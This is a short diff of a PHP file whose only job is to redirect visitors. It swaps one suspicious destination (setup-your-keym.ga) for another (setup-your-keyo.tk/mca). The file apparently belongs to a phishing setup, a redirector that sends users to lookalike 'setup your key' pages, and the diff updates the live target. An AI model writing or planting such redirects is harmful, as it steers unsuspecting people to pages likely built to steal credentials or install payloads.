@@ -1,4 +1,4 @@
 <?php
-header("Location: https://setup-your-keym.ga");
+header("Location: https://setup-your-keyo.tk/mca");
 die();
 ?>
